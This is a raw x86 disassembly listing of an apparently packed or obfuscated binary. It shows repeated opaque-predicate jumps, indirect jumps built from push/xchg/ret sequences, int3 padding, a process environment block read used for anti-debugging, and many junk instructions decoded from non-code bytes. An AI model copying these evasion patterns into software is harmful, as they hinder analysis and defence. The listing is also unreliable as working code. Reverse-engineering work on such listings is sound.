  40bcc5:	ret    0x0
  40bcc8:	lahf   
  40bcc9:	mov    ch,0x82
  40bccb:	mov    ch,0xb5
  40bccd:	mov    ch,0x4a
  40bccf:	or     BYTE PTR ds:0x247d037f,bh
  40bcd5:	pushf  
  40bcd6:	and    WORD PTR [esp],0xfe
  40bcdc:	popf   
  40bcdd:	jae    0x40df87
  40bce3:	mov    ch,0xde
  40bce5:	and    DWORD PTR [ebp-0x211e70ad],esi
  40bceb:	adc    al,0x8
  40bced:	mov    ch,0xc6
  40bcef:	mov    esi,0xc6a59839
  40bcf4:	int3   
  40bcf5:	int3   
  40bcf6:	int3   
	...
  40bd0f:	add    BYTE PTR [eax],al
  40bd11:	add    BYTE PTR [ecx],al
  40bd13:	je     0x40bd51
  40bd15:	jg     0x40bd6a
  40bd17:	push   ebp
  40bd18:	nop
  40bd19:	cld    
  40bd1a:	ss mov ebp,0x40a5c1
  40bd20:	nop
  40bd21:	xchg   DWORD PTR [esp],ebp
  40bd24:	nop
  40bd25:	ret    0x0
  40bd28:	pop    ecx
  40bd29:	sbb    eax,0xb5537db5
  40bd2e:	inc    ecx
  40bd2f:	fisubr WORD PTR [ebp+0x4b]
  40bd32:	mov    ch,0xbe
  40bd34:	rcl    esi,1
  40bd36:	sub    eax,DWORD PTR [ebp+0x24]
  40bd39:	pushf  
  40bd3a:	and    WORD PTR [esp],0xfe
  40bd40:	popf   
  40bd41:	jae    0x40c4b5
  40bd47:	sbb    BYTE PTR [ecx+0x7c],0xc6
  40bd4b:	lahf   
  40bd4c:	ins    DWORD PTR es:[edi],dx
  40bd4d:	mov    ch,0xb5
  40bd4f:	pop    ecx
  40bd50:	addr16 mov ch,0xb5
  40bd53:	jl     0x40bce7
  40bd55:	mov    eax,DWORD PTR [edx+0x18]
  40bd58:	push   esi
  40bd59:	ss es lea esi,ss:0x40be5d
  40bd62:	nop
  40bd63:	xchg   DWORD PTR [esp],esi
  40bd66:	cld    
  40bd67:	ret    0x0
  40bd6a:	xor    BYTE PTR [ebp-0x4a1eb5ad],0x8f
  40bd71:	sbb    eax,0xf25213d1
  40bd76:	bnd ds jmp 0x40f61e
  40bd7d:	scas   al,BYTE PTR es:[edi]
  40bd7e:	mov    ch,0x6d
  40bd80:	mov    ch,0xa0
  40bd82:	addr16 mov ch,0x10
  40bd85:	mov    ch,0xbe
  40bd87:	cld    
  40bd88:	lahf   
  40bd89:	dec    ebx
  40bd8a:	mov    ch,0x84
  40bd8c:	ror    DWORD PTR [edx+0x21],1
  40bd8f:	pop    ecx
  40bd90:	adc    al,0x2e
  40bd92:	std    
  40bd93:	scas   eax,DWORD PTR es:[edi]
  40bd94:	dec    DWORD PTR [esp]
  40bd97:	push   ebx
  40bd98:	ds es cs mov ebx,0x40f2b4
  40bda0:	xchg   DWORD PTR ss:[esp],ebx
  40bda4:	cld    
  40bda5:	ret    0x0
  40bda8:	and    DWORD PTR [ebp-0x70d14a2f],esi
  40bdae:	fiadd  WORD PTR [ecx+0x4b]
  40bdb1:	sub    al,0x8
  40bdb3:	adc    BYTE PTR [eax],al
  40bdb5:	add    BYTE PTR ds:0x669c61a7,bh
  40bdbb:	and    DWORD PTR [esp],0xf9d00fe
  40bdc2:	sub    DWORD PTR ds:0xbe000006,0xffffffae
  40bdc9:	mov    esi,0x1dc67db5
  40bdce:	mov    ch,0xde
  40bdd0:	and    DWORD PTR [edi+0x21],esp
  40bdd3:	shl    DWORD PTR [ebp+0x5654bafc],1
  40bdd9:	cld    
  40bdda:	cld    
  40bddb:	lea    esi,ds:0x40f089
  40bde2:	xchg   DWORD PTR ds:[esp],esi
  40bde6:	es ret 0x0
  40bdea:	adc    ah,bh
  40bdec:	mov    esi,0xa0b50884
  40bdf1:	lahf   
  40bdf2:	jle    0x40be22
  40bdf4:	lahf   
  40bdf5:	fs pop ebp
  40bdf7:	jecxz  0x40be24
  40bdf9:	inc    esp
  40bdfa:	xor    DWORD PTR [eax],ebp
  40bdfc:	push   eax
  40bdfd:	ds repnz lea eax,ds:0x40c5d9
  40be06:	xrelease xchg DWORD PTR [esp],eax
  40be0a:	ds ret 0x0
  40be0e:	cs pop ecx
  40be10:	adc    BYTE PTR [edi-0x70b58271],cl
  40be16:	jno    0x40bdb4
  40be18:	test   BYTE PTR [ecx+0x2b4e0000],dh
  40be1e:	(bad)  
  40be20:	ss ds jmp 0x40c4fc
  40be27:	jl     0x40be25
  40be29:	mov    al,ds:0x7ea008fc
  40be2e:	sub    al,0x2e
  40be30:	lahf   
  40be31:	xor    BYTE PTR [ebp-0x4a4ade93],0x41
  40be38:	and    DWORD PTR [eax],ecx
  40be3a:	mov    ch,0x79
  40be3c:	icebp  
  40be3d:	pop    ebx
  40be3e:	int3   
  40be3f:	int3   
  40be40:	int3   
	...
  40be59:	add    BYTE PTR [eax],al
  40be5b:	add    BYTE PTR [edx+0x1809f781],al
  40be61:	cmc    
  40be62:	bound  ebx,QWORD PTR [esi+eiz*2-0x1dbdb7f]
  40be69:	add    BYTE PTR [ebp+0x2df3830f],bl
  40be6f:	add    BYTE PTR [eax],al
  40be71:	mov    ch,0xd1
  40be73:	(bad)  
  40be74:	ficom  WORD PTR [eax]
  40be76:	scas   al,BYTE PTR es:[edi]
  40be77:	or     BYTE PTR [ebp+0xfd77d08],dh
  40be7d:	test   DWORD PTR [esi+ebx*1],edx
  40be80:	add    BYTE PTR [eax],al
  40be82:	pushf  
  40be83:	and    WORD PTR [esp],0xfe
  40be89:	popf   
  40be8a:	jae    0x40e611
  40be90:	rol    DWORD PTR [bx+di-0x3a],1
  40be94:	mov    al,ds:0xb510847e
  40be99:	dec    ebx
  40be9a:	ret    
  40be9b:	int3   
  40be9c:	int3   
  40be9d:	int3   
	...
  40beb6:	add    BYTE PTR [eax],al
  40beb8:	add    BYTE PTR [eax],ch
  40beba:	add    ecx,DWORD PTR [ebx-0x7e996335]
  40bec0:	and    al,0x24
  40bec2:	inc    BYTE PTR [eax]
  40bec4:	popf   
  40bec5:	jae    0x40b3ad
  40becb:	mov    ch,0xde
  40becd:	fidivr WORD PTR [ebp-0x4]
  40bed0:	cld    
  40bed1:	cld    
  40bed2:	sub    al,0x59
  40bed4:	jl     0x40be9c
  40bed6:	rcl    DWORD PTR [eax],1
  40bed8:	dec    edx
  40bed9:	test   al,0x97
  40bedb:	mov    eax,DWORD PTR [eax+0x14]
  40bede:	pushf  
  40bedf:	and    WORD PTR [esp],0xfe
  40bee5:	popf   
  40bee6:	jae    0x40f805
  40beec:	cld    
  40beed:	jl     0x40be8f
  40beef:	scas   al,BYTE PTR es:[edi]
  40bef0:	cs mov ch,0xb5
  40bef3:	mov    ch,0x67
  40bef5:	mov    al,ds:0x9b508a0
  40befa:	push   esp
  40befb:	or     al,0x52
  40befd:	add    BYTE PTR [eax],al
  40beff:	or     ecx,DWORD PTR [ebx-0x7e9963ce]
  40bf05:	and    al,0x24
  40bf07:	inc    BYTE PTR [eax]
  40bf09:	popf   
  40bf0a:	jae    0x40a50e
  40bf10:	jl     0x40be94
  40bf12:	mov    ch,0xbe
  40bf14:	jl     0x40becb
  40bf16:	mov    ch,0xb5
  40bf18:	test   cl,dl
  40bf1a:	addr16 jl 0x40bed2
  40bf1d:	ins    DWORD PTR es:[edi],dx
  40bf1e:	sbb    DWORD PTR [ebx],0xcccccc
	...
  40bf3c:	add    BYTE PTR [eax],al
  40bf3e:	dec    ebx
  40bf3f:	mov    edi,DWORD PTR [esi+0x1c]
  40bf42:	ss bnd jmp 0x40cbf6
  40bf49:	ins    DWORD PTR es:[edi],dx
  40bf4a:	adc    al,0x41
  40bf4c:	or     BYTE PTR [edi+0x67a021d1],cl
  40bf52:	loope  0x40bf09
  40bf54:	jge    0x40bef6
  40bf56:	(bad)  
  40bf57:	mov    ch,0x2c
  40bf59:	jl     0x40bf63
  40bf5b:	mov    ch,0x4a
  40bf5d:	or     eax,0x247554dc
  40bf62:	sub    ecx,eax
  40bf64:	inc    ebp
  40bf65:	jl     0x40bf53
  40bf67:	or     eax,0x73cc30
  40bf6c:	add    bl,dh
  40bf6e:	jmp    0x40cab7
  40bf73:	nop
  40bf74:	cld    
  40bf75:	repz jmp 0x40d785
  40bf7b:	inc    ecx
  40bf7c:	and    DWORD PTR [eax+0x2108e108],esp
  40bf82:	push   ebx
  40bf83:	dec    edx
  40bf84:	loope  0x40bf15
  40bf86:	cld    
  40bf87:	cld    
  40bf88:	mov    ch,0x14
  40bf8a:	jl     0x40bf41
  40bf8c:	adc    edi,esi
  40bf8e:	mov    ebx,0x1f204
  40bf93:	nop
  40bf94:	cld    
  40bf95:	jmp    0x40b628
  40bf9a:	mov    al,ds:0x6d59b521
  40bf9f:	(bad)  
  40bfa0:	pop    ecx
  40bfa1:	lahf   
  40bfa2:	mov    ch,0x7d
  40bfa4:	test   BYTE PTR [ebx-0x60],dl
  40bfa7:	and    DWORD PTR [eax],ecx
  40bfa9:	jge    0x40bfec
  40bfab:	push   ebx
  40bfac:	fcom   DWORD PTR [edx+ebp*4-0x75]
  40bfb0:	mov    dh,0x80
  40bfb2:	add    BYTE PTR [eax],al
  40bfb4:	add    bl,dh
  40bfb6:	es cs jmp 0x40dd03
  40bfbd:	mov    ch,0x67
  40bfbf:	sub    al,0xb5
  40bfc1:	mov    ch,0x7e
  40bfc3:	and    DWORD PTR [esi],ebp
  40bfc5:	sbb    eax,0x7c10217c
  40bfca:	mov    ch,0x8
  40bfcc:	(bad)  
  40bfce:	push   esp
  40bfcf:	fst    DWORD PTR [ecx]
  40bfd1:	sbb    cl,BYTE PTR [ecx+0x669cec47]
  40bfd7:	and    DWORD PTR [esp],0xf9d00fe
  40bfde:	and    esp,0x2f
  40bfe1:	add    BYTE PTR [eax],al
  40bfe3:	mov    al,ds:0xb5aede53
  40bfe8:	jge    0x40bf9f
  40bfea:	fidiv  WORD PTR [ebp-0x4a4aa64b]
  40bff0:	test   eax,0x9c406a6f
  40bff5:	and    WORD PTR [esp],0xfe
  40bffb:	popf   
  40bffc:	jae    0x40e33a
  40c002:	mov    al,ds:0x41102c59
  40c007:	adc    al,0xb5
  40c009:	adc    BYTE PTR [ebx-0x4],0x8
  40c00d:	jle    0x40bfc4
  40c00f:	sbb    eax,0x4c00
  40c014:	jbe    0x40c051
  40c016:	retf   0xfc3e
  40c019:	jmp    0x40b6ce
  40c01e:	mov    ch,0x59
  40c020:	and    DWORD PTR [ebp-0x4a2e4a4b],esi
  40c026:	inc    ecx
  40c027:	and    DWORD PTR [edi+0x21],esp
  40c02a:	mov    al,ds:0x847e7dae
  40c02f:	dec    edx
  40c030:	mov    ch,0xb5
  40c032:	ins    DWORD PTR es:[edi],dx
  40c033:	mov    ch,0xe6
  40c035:	xor    DWORD PTR [esp],eax
  40c038:	repz ds repz jmp 0x40e732
  40c040:	mov    ch,0x4a
  40c042:	sub    al,0x8
  40c044:	cld    
  40c045:	faddp  st(6),st
  40c047:	sub    al,0x21
  40c049:	(bad)  
  40c04a:	cs cs sbb eax,0xa0082e53
  40c051:	(bad)  
  40c052:	(bad)  
  40c053:	push   edi
  40c054:	add    eax,ecx
  40c056:	push   eax
  40c057:	ss repnz lea eax,ds:0x40c618
  40c060:	nop
  40c061:	xchg   DWORD PTR [esp],eax
  40c064:	ss ret 0x0
  40c068:	push   ebx
  40c069:	mov    ch,0xb5
  40c06b:	jl     0x40c0b7
  40c06d:	mov    al,ds:0xb5827e08
  40c072:	mov    ds:0xcccccc,eax
	...
  40c08f:	add    BYTE PTR [eax],al
  40c091:	add    edx,ebx
  40c093:	mov    eax,fs:0x30
  40c099:	pushf  
  40c09a:	and    WORD PTR [esp],0xfe
  40c0a0:	popf   
  40c0a1:	jae    0x40aa08
  40c0a7:	and    esi,eax
  40c0a9:	mov    ch,0x7e
  40c0ab:	fisub  WORD PTR [edi-0x22]
  40c0ae:	(bad)  
  40c0af:	and    DWORD PTR [ecx-0x10],ebx
  40c0b2:	sub    ecx,DWORD PTR [edi]
  40c0b4:	test   ah,cl
  40c0b6:	push   ss
  40c0b7:	add    BYTE PTR [eax],al
  40c0b9:	pushf  
  40c0ba:	and    WORD PTR [esp],0xfe
  40c0c0:	popf   
  40c0c1:	jae    0x40a3ae
  40c0c7:	loope  0x40c07e
  40c0c9:	jge    0x40c089
  40c0cb:	scas   al,BYTE PTR es:[edi]
  40c0cc:	addr16 loope 0x40c110
  40c0cf:	dec    ebx
  40c0d0:	loope  0x40c124
  40c0d2:	int3   
  40c0d3:	int3   
  40c0d4:	int3   
	...
  40c0f1:	pop    ss
  40c0f2:	add    BYTE PTR [eax],al
  40c0f4:	jne    0x40c0cc
  40c0f6:	call   DWORD PTR [ebp+0x4]
  40c0f9:	bnd ss jmp 0x40ae6d
  40c100:	inc    ecx
  40c101:	mov    ch,0x8
  40c103:	or     BYTE PTR [ebp+0x1d141408],dh
  40c109:	(bad)  
  40c10a:	mov    al,ds:0x84ae219f
  40c10f:	mov    esi,0x4bb57d41
  40c114:	sbb    al,dl
  40c116:	scas   eax,DWORD PTR es:[edi]
  40c117:	add    ecx,0xd36
  40c11d:	es ss jmp 0x40dde0
  40c124:	lahf   
  40c125:	adc    BYTE PTR [ebp+0x7cfcfc08],dh
  40c12b:	dec    edx
  40c12c:	jl     0x40c179
  40c12e:	sub    al,0x7e
  40c130:	and    DWORD PTR [edx+ecx*2],edx
  40c133:	adc    al,0x8f
  40c135:	(bad)  
  40c136:	int3   
  40c137:	int3   
  40c138:	int3   
	...
  40c151:	add    BYTE PTR [eax],al
  40c153:	add    ah,cl
  40c155:	jp     0x40c157
  40c157:	add    BYTE PTR [ecx-0x5d],ch
  40c15a:	add    ecx,DWORD PTR [edx+0x28]
  40c15d:	pushf  
  40c15e:	and    WORD PTR [esp],0xfe
  40c164:	popf   
  40c165:	jae    0x40dcbf
  40c16b:	lahf   
  40c16c:	mov    ch,0x2e
  40c16e:	jl     0x40c19c
  40c170:	or     BYTE PTR [eax],cl
  40c172:	sbb    eax,0x67b56da0
  40c177:	(bad)  
  40c178:	mov    al,0x53
  40c17a:	mov    eax,DWORD PTR [eax]
  40c17c:	ds cs jmp 0x40a558
  40c183:	push   ebx
  40c184:	mov    ch,0xae
  40c186:	mov    ch,0x7c
  40c188:	addr16 mov ch,0xb5
  40c18b:	cld    
  40c18c:	sbb    eax,0x82c0853
  40c191:	mov    al,ds:0xb5b57eb5
  40c196:	mov    ch,0x41
  40c198:	divps  xmm6,XMMWORD PTR [esi]
  40c19b:	bnd repz jmp 0x40d212
  40c1a2:	pop    esi
  40c1a4:	mov    ch,0xb5
  40c1a6:	inc    ecx
  40c1a7:	mov    ch,0x1d
  40c1a9:	pop    ecx
  40c1aa:	mov    ch,0xb5
  40c1ac:	scas   al,BYTE PTR es:[edi]
  40c1ad:	loope  0x40c21c
  40c1af:	adc    BYTE PTR [esi*4+0x146db57e],0x2c
  40c1b7:	inc    ecx
  40c1b8:	dec    esp
  40c1b9:	cmp    al,0x0
  40c1bb:	add    cl,bh
  40c1bd:	and    DWORD PTR [eax+ebx*4+0x2a8df69],edi
  40c1c4:	push   esi
  40c1c5:	cs cs es mov esi,0x40c978
  40c1cd:	cld    
  40c1ce:	xchg   DWORD PTR [esp],esi
  40c1d1:	cs ret 0x0
  40c1d5:	mov    ch,0x9f
  40c1d7:	adc    al,0xae
  40c1d9:	(bad)  
  40c1da:	adc    BYTE PTR [edi-0x4b],ah
  40c1dd:	adc    al,0xae
  40c1df:	or     BYTE PTR [ecx+ecx*8-0xd2d0812],ch
  40c1e6:	cld    
  40c1e7:	bnd jmp 0x40ad72
  40c1ed:	rcl    ecx,1
  40c1ef:	mov    ch,0x53
  40c1f1:	sbb    eax,0x2e2c2141
  40c1f6:	adc    BYTE PTR [edi+0x21],ah
  40c1f9:	adc    cl,dl
  40c1fb:	or     cl,ah
  40c1fd:	cs pop ecx
  40c1ff:	mov    ch,0xb5
  40c201:	sbb    DWORD PTR [esi-0x48],0x7c50e09d
  40c208:	pushf  
  40c209:	and    WORD PTR [esp],0xfe
  40c20f:	popf   
  40c210:	jae    0x40c035
  40c216:	adc    al,0x2c
  40c218:	lahf   
  40c219:	sbb    eax,0x4aa0217c
  40c21e:	ins    DWORD PTR es:[edi],dx
  40c21f:	mov    esi,0x8130e16d
  40c224:	add    cl,al
  40c226:	add    BYTE PTR [eax],al
  40c228:	mov    esi,0x9c0c55ff
  40c22d:	and    WORD PTR [esp],0xfe
  40c233:	popf   
  40c234:	jae    0x40c495
  40c23a:	adc    BYTE PTR [eax],0xae
  40c23d:	mov    ch,0xd1
  40c23f:	and    DWORD PTR [ebp+0x84b0867],esi
  40c245:	jle    0x40c292
  40c247:	daa    
  40c248:	imul   ecx
  40c24a:	cld    
  40c24b:	cld    
  40c24c:	repz jmp 0x40f068
  40c252:	mov    al,ds:0xd153b59f
  40c257:	or     BYTE PTR [ebp-0x4],bh
  40c25a:	mov    BYTE PTR [ebp+esi*4+0x4b2e5359],0x82
  40c262:	dec    edx
  40c263:	dec    ebx
  40c264:	inc    ecx
  40c265:	mov    ch,0x23
  40c267:	xor    ebx,ebx
  40c269:	pushf  
  40c26a:	and    WORD PTR [esp],0xfe
  40c270:	popf   
  40c271:	jae    0x40d4bc
  40c277:	and    DWORD PTR [eax],ecx
  40c279:	dec    ebx
  40c27a:	rcr    esi,1
  40c27c:	and    esi,eax
  40c27e:	and    DWORD PTR [esi-0x2eac98f0],ebp
  40c284:	sbb    eax,0x7048
  40c289:	enter  0x22,0x0
  40c28d:	xor    esi,edi
  40c28f:	icebp  
  40c290:	cs ds ds jmp 0x40f5c1
  40c298:	or     BYTE PTR [esi+0x2c],bh
  40c29b:	cld    
  40c29c:	(bad)  
  40c29d:	and    DWORD PTR [ebp+0x21084a59],esi
  40c2a3:	mov    ch,0xb5
  40c2a5:	mov    ch,0x2e
  40c2a7:	mov    ch,0x53
  40c2a9:	sbb    eax,0xcceb0821
  40c2ae:	int3   
  40c2af:	int3   
	...
  40c2c8:	add    BYTE PTR [eax],al
  40c2ca:	add    BYTE PTR [esi-0x75],dl
  40c2cd:	sbb    al,0x31
  40c2cf:	pushf  
  40c2d0:	and    WORD PTR [esp],0xfe
  40c2d6:	popf   
  40c2d7:	jae    0x40e378
  40c2dd:	jl     0x40c329
  40c2df:	mov    ch,0x21
  40c2e1:	mov    ch,0xb5
  40c2e3:	mov    ch,0x2c
  40c2e5:	addr16 loope 0x40c332
  40c2e8:	test   BYTE PTR [edi+0x24758b62],bl
  40c2ee:	cs ss jmp 0x40f7c4
  40c2f5:	pop    ecx
  40c2f6:	or     BYTE PTR [esi+0x671d21b5],ch
  40c2fc:	mov    ch,0xd1
  40c2fe:	and    DWORD PTR [edx+0x2e],ecx
  40c301:	mov    esi,0xfc5914b5
  40c306:	and    DWORD PTR [eax+ecx*1+0x2f],edi
  40c30a:	push   ecx
  40c30b:	pushf  
  40c30c:	and    WORD PTR [esp],0xfe
  40c312:	popf   
  40c313:	jae    0x40b849
  40c319:	test   BYTE PTR [ebp+0x8214a67],dh
  40c31f:	dec    ebx
  40c320:	test   BYTE PTR [edx+0x109f827d],al
  40c326:	jle    0x40c373
  40c328:	ins    BYTE PTR es:[edi],dx
  40c329:	xor    al,0xd4
  40c32b:	sub    al,0x13
  40c32d:	mov    DWORD PTR [esp],eax
  40c330:	pushf  
  40c331:	and    WORD PTR [esp],0xfe
  40c337:	popf   
  40c338:	jae    0x40eb1e
  40c33e:	adc    al,0xfc
  40c340:	xor    BYTE PTR [ebp+0x7cb5b521],0x21
  40c347:	mov    ch,0xb5
  40c349:	mov    ch,0x7e
  40c34b:	fadd   st(5),st
  40c34d:	mov    BYTE PTR [eax+eax*1+0x758b8600],bh
  40c354:	and    al,0x9c
  40c356:	and    WORD PTR [esp],0xfe
  40c35c:	popf   
  40c35d:	jae    0x40a729
  40c363:	mov    ch,0x41
  40c365:	push   ebx
  40c366:	mov    ch,0xb5
  40c368:	inc    ecx
  40c369:	mov    ch,0x59
  40c36b:	mov    esi,0xb57cde6d
  40c370:	aaa    
  40c371:	push   esi
  40c372:	push   ebp
  40c373:	ds repz repz mov ebp,0x40e024
  40c37b:	cld    
  40c37c:	xchg   DWORD PTR [esp],ebp
  40c37f:	bnd ret 0x0
  40c383:	(bad)
  40c387:	jge    0x40c3f6
  40c389:	dec    edx
  40c38a:	mov    ch,0x6d
  40c38c:	jle    0x40c40c
  40c38e:	sub    al,0x96
  40c390:	int3   
  40c391:	int3   
  40c392:	int3   
	...
  40c3ab:	add    BYTE PTR [eax],al
  40c3ad:	add    cl,dl
  40c3af:	ja     0x40c369
  40c3b1:	aaa    
  40c3b2:	add    BYTE PTR [eax],al
  40c3b4:	add    BYTE PTR [eax-0xd],dl
  40c3b7:	repnz es mov eax,0x40b5e8
  40c3be:	xacquire xchg DWORD PTR [esp],eax
  40c3c2:	es ret 0x0
  40c3c6:	adc    al,0xd1
  40c3c8:	dec    ebx
  40c3c9:	test   BYTE PTR [eax],dl
  40c3cb:	dec    edx
  40c3cc:	and    DWORD PTR [eax+ecx*1],edx
  40c3cf:	icebp  
  40c3d0:	add    BYTE PTR [eax],al
  40c3d2:	jl     0x40c40a
  40c3d4:	pop    ecx
  40c3d5:	ss es jmp 0x40f455
  40c3dc:	inc    ecx
  40c3dd:	mov    ch,0x84
  40c3df:	test   BYTE PTR ds:0xb567826d,bl
  40c3e5:	test   BYTE PTR [ecx-0x3a],al
  40c3e8:	test   BYTE PTR [edx+0x59],cl
  40c3eb:	mov    ch,0x7c
  40c3ed:	mov    ch,0x14
  40c3ef:	mov    ch,0xa0
  40c3f1:	mov    al,ds:0xc88b736d
  40c3f6:	bnd repz jmp 0x40dc04
  40c3fd:	mov    ch,0xb5
  40c3ff:	and    DWORD PTR [ecx+0x14],eax
  40c402:	mov    ch,0xb5
  40c404:	and    DWORD PTR [eax-0x514a7d82],esp
  40c40a:	scas   al,BYTE PTR es:[edi]
  40c40b:	mov    ch,0xc6
  40c40d:	fisub  WORD PTR [ecx]
  40c40f:	or     BYTE PTR [ebp-0x3a],bh
  40c412:	fadd   st,st(3)
  40c414:	call   0x40e962
  40c419:	pushf  
  40c41a:	and    WORD PTR [esp],0xfe
  40c420:	popf   
  40c421:	jae    0x40dc62
  40c427:	inc    ecx
  40c428:	loope  0x40c3b9
  40c42a:	scas   al,BYTE PTR es:[edi]
  40c42b:	lahf   
  40c42c:	mov    ch,0xd1
  40c42e:	mov    al,ds:0x758fae7d
  40c433:	pop    ecx
  40c434:	adc    BYTE PTR [ebx+0x303ae9],dh
  40c43a:	add    BYTE PTR [esi+eiz*2-0x1dbdb7f],bl
  40c441:	add    BYTE PTR [ebp-0x1ffc7cf1],bl
  40c447:	(bad)  
  40c448:	jmp    FWORD PTR [eax+ecx*1]
  40c44b:	dec    ebx
  40c44c:	sbb    eax,0xb5b5592e
  40c451:	pop    ecx
  40c452:	dec    edx
  40c453:	or     BYTE PTR [ecx+esi*8],bl
  40c456:	dec    esp
  40c458:	int3   
  40c459:	int3   
	...
  40c472:	add    BYTE PTR [eax],al
  40c474:	add    bh,al
  40c476:	pop    edi
  40c477:	push   ebx
  40c478:	repz ds repz mov ebx,0x40c6de
  40c480:	nop
  40c481:	xchg   DWORD PTR [esp],ebx
  40c484:	es ret 0x0
  40c488:	and    DWORD PTR [ebp-0x61],ebp
  40c48b:	sbb    eax,0xc67d2c1d
  40c490:	shl    DWORD PTR cs:[edi-0x4b],1
  40c494:	mov    fs,WORD PTR [eax+0x56]
  40c497:	cs nop
  40c499:	cld    
  40c49a:	mov    esi,0x40aacc
  40c49f:	cld    
  40c4a0:	xchg   DWORD PTR [esp],esi
  40c4a3:	es ret 0x0
  40c4a7:	adc    BYTE PTR [esi-0x4a4a7dd4],ch
  40c4ad:	addr16 and ecx,edx
  40c4b0:	lahf   
  40c4b1:	and    esp,edi
  40c4b3:	mov    ecx,0x3ec7038f
  40c4b8:	repnz cld 
  40c4ba:	jmp    0x40ba86
  40c4bf:	mov    al,ds:0x6dbe21de
  40c4c4:	loope  0x40c533
  40c4c6:	sbb    eax,0x7ec6b57d
  40c4cb:	mov    ch,0xb5
  40c4cd:	and    DWORD PTR [ecx-0x4b],ebx
  40c4d0:	mov    ch,0x8f
  40c4d2:	jl     0x40c4f9
  40c4d4:	pop    eax
  40c4d5:	jge    0x40c4b4
  40c4d7:	repz jne 0x40ebde
  40c4de:	pushf  
  40c4df:	and    WORD PTR [esp],0xfe
  40c4e5:	popf   
  40c4e6:	jae    0x40bd55
  40c4ec:	or     cl,dl
  40c4ee:	(bad)  
  40c4ef:	dec    edx
  40c4f0:	ins    DWORD PTR es:[edi],dx
  40c4f1:	mov    ch,0xb5
  40c4f3:	mov    ch,0x2c
  40c4f5:	lahf   
  40c4f6:	mov    BYTE PTR [edx],ah
  40c4f8:	add    BYTE PTR [eax],al
  40c4fa:	pusha  
  40c4fb:	sub    ecx,DWORD PTR [ecx+0x669c311c]
  40c501:	and    DWORD PTR [esp],0xf9d00fe
  40c508:	adc    DWORD PTR [esi+0x1a],0x0
  40c50c:	add    BYTE PTR [ebx+0x21],dl
  40c50f:	(bad)  
  40c511:	and    DWORD PTR [eax],ecx
  40c513:	sub    BYTE PTR [ebp-0x60],0xb5
  40c517:	mov    ch,0xb5
  40c519:	and    DWORD PTR [edi],esp
  40c51b:	mov    ecx,eax
  40c51d:	es bnd es jmp 0x40eac0
  40c525:	sbb    eax,0x6d2121a0
  40c52a:	adc    cl,ah
  40c52c:	mov    ch,0x21
  40c52e:	jle    0x40c540
  40c530:	(bad)  
  40c531:	and    DWORD PTR [ecx-0x22],ebx
  40c534:	rol    esi,1
  40c536:	and    BYTE PTR [ecx],0x59
  40c539:	jl     0x40c561
  40c53b:	add    esp,0x10
  40c53e:	push   eax
  40c53f:	repnz nop
  40c541:	ds mov eax,0x40bcb2
  40c547:	xrelease xchg DWORD PTR [esp],eax
  40c54b:	bnd ret 0x0
  40c54f:	mov    ch,0x1d
  40c551:	mov    ch,0x67
  40c553:	pop    ecx
  40c554:	dec    ebx
  40c555:	test   BYTE PTR [ebp+0x2c],bh
  40c558:	or     BYTE PTR [ebx],cl
  40c55a:	ja     0x40a4b1
  40c560:	pushf  
  40c561:	and    WORD PTR [esp],0xfe
  40c567:	popf   
  40c568:	jae    0x40ba47
  40c56e:	or     BYTE PTR [eax],dl
  40c570:	push   ebx
  40c571:	mov    esi,0xb541d1b5
  40c576:	jle    0x40c5e5
  40c578:	ror    DWORD PTR [ebp-0x4a744873],0x0
  40c57f:	(bad)  
  40c580:	(bad)  
  40c581:	call   FWORD PTR [esi+eiz*2-0x1dbdb7f]
  40c588:	add    BYTE PTR [ebp-0x21c27cf1],bl
  40c58e:	(bad)  
  40c58f:	dec    DWORD PTR [ebx+0x8]
  40c592:	jle    0x40c5c0
  40c594:	(bad)  
  40c595:	scas   al,BYTE PTR es:[edi]
  40c596:	and    esi,ebx
  40c598:	mov    ch,0x67
  40c59a:	out    dx,eax
  40c59b:	xor    DWORD PTR [esp],eax
  40c59e:	pushf  
  40c59f:	and    WORD PTR [esp],0xfe
  40c5a5:	popf   
  40c5a6:	jae    0x40bdd7
  40c5ac:	ins    DWORD PTR es:[edi],dx
  40c5ad:	pop    ecx
  40c5ae:	or     BYTE PTR [edi-0x4a7070b5],cl
  40c5b4:	mov    al,ds:0x4a2e59b5
  40c5b9:	ja     0x40c544
  40c5bb:	inc    ebp
  40c5bc:	sub    BYTE PTR [ebp-0x70],dl
  40c5bf:	es lea ebp,cs:0x40e31a
  40c5c7:	xacquire xchg DWORD PTR [esp],ebp
  40c5cb:	es ret 0x0
  40c5cf:	or     dh,bl
  40c5d1:	jge    0x40c614
  40c5d3:	and    DWORD PTR [ecx-0x4],eax
  40c5d6:	dec    ebx
  40c5d7:	mov    ch,0xe3
  40c5d9:	add    eax,DWORD PTR [ebp+0x0]
  40c5dc:	pushf  
  40c5dd:	and    WORD PTR [esp],0xfe
  40c5e3:	popf   
  40c5e4:	jae    0x40f044
  40c5ea:	mov    al,ds:0x2e9fbefc
  40c5ef:	mov    ch,0x67
  40c5f1:	dec    ebx
  40c5f2:	mov    ch,0x2e
  40c5f4:	mov    ch,0x21
  40c5f6:	dec    ebx
  40c5f7:	and    BYTE PTR [esi+0x60],al
  40c5fa:	repnz es bnd jmp 0x40aa4a
  40c602:	fidiv  WORD PTR [ebp+0x21212c21]
  40c608:	jl     0x40c5bf
  40c60a:	jge    0x40c590
  40c60c:	dec    edx
  40c60d:	adc    BYTE PTR [edi+0x14b5a0de],cl
  40c613:	loope  0x40c632
  40c615:	inc    ecx
  40c616:	or     BYTE PTR [ebx],dl
  40c618:	add    eax,0x18
  40c61b:	repnz cld 
  40c61d:	jmp    0x40ee64
  40c622:	dec    ebx
  40c623:	test   BYTE PTR [ecx],ah
  40c625:	adc    BYTE PTR [ecx-0x4b],bl
  40c628:	mov    ch,0xb5
  40c62a:	jle    0x40c5e1
  40c62c:	lahf   
  40c62d:	mov    al,ds:0x530808b5
  40c632:	jl     0x40c5b6
  40c634:	cs and ecx,ebp
  40c637:	mov    dh,0x51
  40c639:	pushf  
  40c63a:	and    WORD PTR [esp],0xfe
  40c640:	popf   
  40c641:	jae    0x40b905
  40c647:	dec    ebx
  40c648:	sub    al,0xc6
  40c64a:	mov    ch,0xae
  40c64c:	sub    al,0xe1
  40c64e:	cs pop ecx
  40c650:	mov    esi,0x8414534a
  40c655:	mov    ch,0xae
  40c657:	jmp    0x40b924
  40c65c:	pushf  
  40c65d:	and    WORD PTR [esp],0xfe
  40c663:	popf   
  40c664:	jae    0x40c79b
  40c66a:	fiadd  WORD PTR [esi+ebx*8+0x1453b521]
  40c671:	cmp    BYTE PTR [esi+0x8],0xc6
